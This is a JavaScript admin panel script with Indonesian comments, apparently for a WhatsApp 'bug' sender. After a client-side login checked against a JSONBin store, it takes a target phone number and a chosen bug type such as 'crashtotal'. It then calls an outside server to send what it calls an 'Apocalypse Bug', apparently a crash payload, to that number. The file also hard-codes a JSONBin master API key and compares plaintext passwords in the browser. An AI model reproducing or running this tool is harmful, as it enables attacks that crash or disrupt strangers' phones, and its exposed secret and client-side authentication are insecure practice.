// admin.js

const BIN_ID = "686d355c8561e97a5033af6a"; // Ganti dengan BIN ID kamu
const API_KEY = "$2a$10$2rTDdHq.CHA3tkZbYEEJO.yx/8VtkA1H2cD5Yow/ktJDTVXfqK0R2"; // Ganti dengan API KEY kamu

// Session Functions
function saveSession(user) {
  sessionStorage.setItem("currentUser", JSON.stringify(user));
}

function getSession() {
  return JSON.parse(sessionStorage.getItem("currentUser"));
}

function logout() {
  sessionStorage.removeItem("currentUser");
  location.reload();
}

// Fetch User List from JSONBin
async function getUsers() {
  try {
    const res = await fetch(`https://api.jsonbin.io/v3/qs/${BIN_ID}`, {
      headers: { "X-Master-Key": API_KEY },
    });
    if (!res.ok) throw new Error("Fetch failed!");
    const json = await res.json();
    return json.record;
  } catch (err) {
    console.error("Error getUsers():", err);
    return [];
  }
}

// Login Process
async function login() {
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();
  const result = document.getElementById("login-result");

  const users = await getUsers();
  const found = users.find(u => u.username === user && u.password === pass);

  if (found) {
    saveSession(found);
    showDashboard(found);
  } else {
    result.innerText = "❌ Username atau Password salah!";
    result.style.color = "crimson";
  }
}

// Show Dashboard
function showDashboard(user) {
  document.getElementById("login-box").style.display = "none";
  document.getElementById("main-box").style.display = "block";
  document.getElementById("userLabel").innerText = user.username;
}

// Auto Login if Session Exists
window.onload = () => {
  const user = getSession();
  if (user) showDashboard(user);
};

// Bug Selection UI
let selectedBug = "crashtotal";
document.querySelectorAll(".bug-card").forEach(card => {
  card.addEventListener("click", () => {
    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
    card.classList.add("active");
    selectedBug = card.getAttribute("data-bug");
  });
});

// Show / Close Popup
function showPopup(message) {
  document.getElementById("popup-message").innerHTML = message;
  document.getElementById("popup").style.display = "flex";
}

function closePopup() {
  document.getElementById("popup").style.display = "none";
}

// Kirim Bug
async function sendBug() {
  const input = document.getElementById("target").value.trim();
  const resDiv = document.getElementById("result");
  const btn = document.getElementById("sendBtn");

  if (!/^\d{8,15}$/.test(input)) {
    resDiv.innerText = "Masukkan nomor WA yang valid!";
    resDiv.style.color = "crimson";
    return;
  }

  const chatId = `${input}@s.whatsapp.net`;
  btn.disabled = true;
  const originalHTML = btn.innerHTML;
  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
  resDiv.innerText = "";

  try {
    const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
    const json = await res.json();
    showPopup(`Apocalypse Bug berhasil dikirim ke <b>${input}</b>`);
  } catch (err) {
    resDiv.innerText = "❌ Gagal mengirim: " + err;
    resDiv.style.color = "crimson";
  }

  btn.disabled = false;
  btn.innerHTML = originalHTML;
}
